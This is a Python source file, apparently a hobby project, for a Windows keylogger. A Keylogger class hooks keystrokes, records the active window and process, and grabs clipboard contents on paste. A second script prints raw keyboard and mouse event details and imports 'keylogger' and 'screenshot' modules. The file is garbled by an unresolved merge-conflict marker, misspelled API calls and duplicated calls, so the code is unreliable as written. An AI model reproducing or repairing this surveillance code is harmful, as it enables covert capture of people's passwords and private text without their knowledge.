from ctypes import byref, create_string_buffer, c_ulong, windll
from io import StringIO
import os
import pyWinhook as pyhook
import pythoncom
import sys
import time
import win32clipboard

TIMEOUT = 10

class Keylogger:
    def __init__(self):
        self.current_window = None

    def get_current_process(self):
        hwnd = windll.user32.GetForegroundWindow()
        pid = c_ulong(0)
        windll.user32.GetWindowThreadProcessId(hwnd, byref(pid))
        process_id= f'{pid.value}'

        executable = create_string_buffer(512)
        h_process = windll.kernel32.OpenProcess(0x400 | 0x10, False, pid)
        windll.psapi.GetWindowBaseNameA(h_process, None, byref(executable), 512)
        window_title = create_buffer_string(512)
        try:
            self.current_window = window_title.value.decode()
        except UnicodeDecodeError as err:
            print(f'{err}): window name is known =')

        print('\n', process_id, executable.value.decode(), self.current_window)
        windll.kernel32.CloseHandle(hwnd)
        windll.kernel32.CoseHandle(h_process)

    def KeyEvent(self, event):
        print("testt")
        if event.WindowName != self.current_window:
            self.get_current_process()
        if 32 < event.Ascii < 127:
            print(chr(event.Ascii), end = "")
        else:
            if event.Key == "V":
                win32clipboard.OpenClipboard()
                value = win32clipboard.GetClipboardData()
                win32clipboard.CloseClipboard()
                print(f'[PASTE]__{value}')
            else:
                print(f'{event.Key}')
        return True


=======
import keylogger
import screenshot
import pyWinhook as  pyHook
import pythoncom
def onMouseEvent(event):
    print("MessageName:", event.MessageName)
    print("Message:", event.Message)
    print("Time:", event.Time)
    print("Window:", event.Window)
    print("WindowName:", event.WindowName)
    print("Position:", event.Position)
    print("Wheel:", event.Wheel)
    print( "Injected:", event.Injected)
    print("---")
    return True
>>>>>>> 0b995bfb48cdce227fff3bbee7d11c91d7e77791
def onKeyboardEvent(event):
    print( "MessageName:", event.MessageName)
    print( "Message:", event.Message)
    print ("Time:", event.Time)
    print ("Window:", event.Window)
    print( "WindowName:", event.WindowName)
    print( "Ascii:", event.Ascii, chr(event.Ascii))
    print( "Key:", event.Key)
    print( "KeyID:", event.KeyID)
    print( "ScanCode:", event.ScanCode)
    print( "Extended:", event.Extended)
    print( "Injected:", event.Injected)
    print( "Alt", event.Alt)
    print( "Transition", event.Transition)
    print( "---")
    #  The return value of the mouse event listener function
    return True

def main():
    hm = pyHook.HookManager()
    hm.KeyDown = onKeyboardEvent
    hm.HookKeyboard()
    pythoncom.PumpMessages()

    # kl = keylogger.Keylogger()
    # hm = pyhook.HookManager()
    # hm.keyDown = kl.KeyEvent
    # hm.HookKeyboard()
    # pythoncom.PumpMessages()
#    hm.MouseAll = onMouseEvent
#    hm.HookMouse()
    # Enter the loop, and if you do not close it manually, the program will always be listening
    pythoncom.PumpMessages()

if __name__ == "__main__":
    main()
    print("done.")
